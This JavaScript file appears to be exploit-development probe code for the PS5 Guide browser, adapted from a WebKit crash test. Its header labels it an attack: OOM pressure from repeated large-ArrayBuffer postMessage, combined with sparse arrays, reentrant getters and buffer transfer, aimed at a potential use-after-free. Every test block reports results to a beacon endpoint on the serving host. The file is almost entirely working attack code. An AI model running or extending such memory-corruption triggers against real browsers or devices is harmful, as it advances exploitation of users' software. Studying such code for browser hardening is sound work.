// p511 — postMessage large ArrayBuffer OOM UAF
//
// From Sony PS5 TestExpectations [Crash]: post-message-large-array-buffer-should-not-crash
//
// Attack: prototype poisoning + sparse array + OOM during structuredClone
// 1. Create sparse array with getter at high index
// 2. Post 8MB ArrayBuffer multiple times via postMessage
// 3. Receiver OOMs during deserialization
// 4. OOM recovery with reentrant getter → potential UAF
//
// Adapted for PS5 Guide browser (no window.gc(), no test harness)
//
// Beacon prefix: V511-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V511-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // T1: Basic postMessage large AB test
  // ═══════════════════════════════════════════════════════════
  try {
    var ab = new ArrayBuffer(8 * 1024 * 1024); // 8MB
    B('T1-AB', 'size=' + ab.byteLength);

    // Post to self — triggers structuredClone serialization/deserialization
    var received = 0;
    var errors = 0;
    window.addEventListener('message', function(e) {
      received++;
      if (received <= 3) {
        B('T1-RECV', 'idx=' + received + ',size=' + (e.data ? e.data.byteLength || 'no-bl' : 'null'));
      }
    });

    // Send 10 times rapidly
    for (var i = 0; i < 10; i++) {
      try {
        window.postMessage(ab, '*');
      } catch(e) {
        errors++;
      }
    }
    B('T1-SENT', 'count=10,errors=' + errors);
  } catch(e) {
    B('T1-ERR', e.name + ':' + e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // T2: Sparse array with prototype poisoning + postMessage
  // ═══════════════════════════════════════════════════════════
  try {
    var a = [];
    // Create sparse array with getter at high index
    Object.defineProperty(a, 80000000, {
      get: function() {
        // This getter fires during structuredClone traversal
        // At this point, allocator state may be corrupted by OOM
        B('T2-GETTER', 'fired during clone');
        return 42;
      },
      enumerable: true,
      configurable: true
    });
    a.length = 80000001;

    B('T2-SPARSE', 'length=' + a.length);

    var ab2 = new ArrayBuffer(8 * 1024 * 1024);
    var msg = { arr: a, buf: ab2 };

    var t2recv = 0;
    window.addEventListener('message', function(e) {
      if (e.data && e.data.arr) {
        t2recv++;
        B('T2-RECV', 'idx=' + t2recv);
      }
    });

    for (var j = 0; j < 5; j++) {
      try {
        window.postMessage(msg, '*');
      } catch(e) {
        B('T2-SEND-ERR', 'j=' + j + ',' + e.name);
      }
    }
    B('T2-SENT', 'count=5');
  } catch(e) {
    B('T2-ERR', e.name + ':' + e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // T3: Transfer ArrayBuffer (detach) + prototype getter
  // ═══════════════════════════════════════════════════════════
  try {
    var ab3 = new ArrayBuffer(4 * 1024 * 1024);
    var view = new Uint8Array(ab3);
    view[0] = 0xDE; view[1] = 0xAD;

    var triggerCount = 0;
    var obj3 = {};
    Object.defineProperty(obj3, 'data', {
      get: function() {
        triggerCount++;
        if (triggerCount === 1) {
          // Try to access the AB during clone — it may be mid-transfer
          try {
            var check = view[0];
            B('T3-GETTER-VIEW', 'val=' + check + ',detached=' + (ab3.byteLength === 0));
          } catch(e) {
            B('T3-GETTER-DETACH', e.name);
          }
        }
        return ab3;
      },
      enumerable: true
    });

    // Post with transfer list — AB gets detached during clone
    try {
      window.postMessage(obj3, '*', [ab3]);
    } catch(e) {
      B('T3-XFER-ERR', e.name + ':' + e.message);
    }
    B('T3-POST-DETACH', 'bl=' + ab3.byteLength + ',triggers=' + triggerCount);
  } catch(e) {
    B('T3-ERR', e.name + ':' + e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // T4: MessageChannel OOM pressure
  // ═══════════════════════════════════════════════════════════
  try {
    var ch = new MessageChannel();
    var t4recv = 0;
    ch.port2.onmessage = function(e) {
      t4recv++;
      if (t4recv === 1) B('T4-RECV', 'first');
    };
    ch.port2.start();

    // Flood the channel with large buffers
    var sent4 = 0;
    for (var k = 0; k < 20; k++) {
      try {
        var big = new ArrayBuffer(4 * 1024 * 1024);
        ch.port1.postMessage(big);
        sent4++;
      } catch(e) {
        B('T4-OOM', 'k=' + k + ',' + e.name);
        break;
      }
    }
    B('T4-FLOOD', 'sent=' + sent4);
  } catch(e) {
    B('T4-ERR', e.name + ':' + e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // T5: structuredClone with reentrant valueOf
  // ═══════════════════════════════════════════════════════════
  try {
    var hasStructuredClone = typeof structuredClone === 'function';
    B('T5-SC', 'available=' + hasStructuredClone);

    if (hasStructuredClone) {
      var evil = {};
      var cloneCount = 0;
      evil.valueOf = function() {
        cloneCount++;
        B('T5-VALUEOF', 'count=' + cloneCount);
        return 42;
      };
      evil.toString = function() {
        B('T5-TOSTRING', 'fired');
        return 'hello';
      };
      evil[Symbol.toPrimitive] = function(hint) {
        B('T5-TOPRIMITIVE', 'hint=' + hint);
        return hint === 'string' ? 'evil' : 42;
      };

      try {
        var cloned = structuredClone(evil);
        B('T5-RESULT', 'cloned=' + typeof cloned);
      } catch(e) {
        B('T5-CLONE-ERR', e.name + ':' + e.message);
      }
    }
  } catch(e) {
    B('T5-ERR', e.name + ':' + e.message);
  }

  B('DONE', 'all tests complete');
})();
